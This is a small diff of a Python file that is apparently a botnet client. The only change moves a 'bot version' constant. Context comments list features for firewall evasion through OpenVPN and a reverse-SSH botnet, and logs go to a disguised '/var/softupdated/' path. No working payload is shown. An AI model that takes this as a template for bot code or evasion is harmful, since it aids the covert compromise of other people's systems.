@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 # MIT Liscence
+version = "7.5"                                                                 # bot version
 
 # library imports
 import socket
@@ -28,8 +29,6 @@ from modules.logging import logfile, log
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
-
-version = "7.5"                                                                 # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s(%s).log" % (version, strftime("%m-%d|%H:%M")))                  # redirects bot output to logfile
